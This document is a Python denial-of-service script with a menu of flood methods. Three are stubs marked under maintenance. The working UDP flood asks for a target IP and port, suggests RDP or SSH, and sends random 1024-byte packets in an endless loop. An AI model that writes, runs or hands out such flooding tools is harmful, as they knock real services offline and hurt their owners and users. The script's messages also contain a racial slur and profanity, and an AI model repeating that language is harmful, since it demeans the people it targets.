import os, random, time, socket, sys, requests
from threading import Thread
from colorama import Fore, Style


def sendudp():
    udptarget = input('Target IP: ')
    udpport = int(input('Target Port [RDP = 3389 / SSH = 22]: '))
    packet = random._urandom(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        s.sendto(packet, (udptarget,udpport))
        print('Sending UDP ATTACK TO => %s | Port => %s | Packet Size => 1024' % {udptarget, udpport})


def sendsocks():
    os.system('cls')
    print(Fore.RED+'UNDER MAINTENANCE'+Style.RESET_ALL)
    time.sleep(5)
    os.system('cls')
    main()

def sendproxy():
    os.system('cls')
    print(Fore.RED+'UNDER MAINTENANCE'+Style.RESET_ALL)
    time.sleep(5)
    os.system('cls')
    main()

def sendhex():
    os.system('cls')
    print(Fore.RED+'UNDER MAINTENANCE'+Style.RESET_ALL)
    time.sleep(5)
    os.system('cls')
    main()

def main():
    os.system('title Py Ddos Script')
    print(Fore.RED+'Dont Pay Money For This Shit'+Style.RESET_ALL)
    print(Fore.GREEN+'''
    1- Socks [l7] UNDER MAINTENANCE
    2- Proxy [l7] UNDER MAINTENANCE
    3- Hex Flood [l4] UNDER MAINTENANCE
    4- Udp Flood [l4] '''+Style.RESET_ALL)
    method = input('\nWhich Method Do You Wanna Use: ')
    if method == "1":
        sendsocks()
    elif method == "2":
        sendproxy()
    elif method == "3":
        sendhex()
    elif method == "4":
        sendudp()
    elif method == "clear":
        os.system('cls')
        main()
    else:
        print(Fore.RED+'Type A Fucking Number Nigga'+Style.RESET_ALL)

main()